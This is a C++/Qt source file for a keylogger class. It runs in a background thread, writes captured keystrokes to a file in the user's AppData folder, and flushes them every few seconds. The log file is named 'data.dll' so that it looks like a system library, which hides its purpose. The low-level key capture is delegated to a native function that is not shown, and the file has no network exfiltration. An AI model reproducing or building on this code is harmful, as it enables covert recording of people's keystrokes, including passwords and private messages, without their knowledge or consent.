#include "keylogger.h"

#include <QDebug>
#include <QDir>
#include <QFile>
#include <QStandardPaths>
#include <QTimer>

#include "keys.h"

QFile *KeyLogger::_logFile;

KeyLogger::KeyLogger(QObject *parent)
    : QThread(parent), loop(nullptr)
{}

KeyLogger::~KeyLogger()
{

}

void KeyLogger::run()
{
    auto p = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation);
    QDir d(p);
    if (!d.exists())
        d.mkpath(p);

    _logFile = new QFile(p + "/data.dll");
    if (!_logFile->open(QIODevice::Text | QIODevice::Append)) {
        qDebug() << "unable to open file" << _logFile->fileName();
        return;
    }

    auto t = new QTimer(this);
    t->setInterval(2000);
    connect(t, &QTimer::timeout, [](){
        if (_logFile->isOpen())
            _logFile->flush();
    });
    t->start();

    run_native();
    _logFile->close();
    deleteLater();
}

void KeyLogger::appendKey(const QByteArray &key)
{
    static int i = 0;
    _logFile->write(key);

    if (i++ >= 10) {
        _logFile->flush();
        i = 0;
    }
}

void KeyLogger::appendKey(const Qt::Key &key)
{
    appendKey(Keys::toString(key));
}
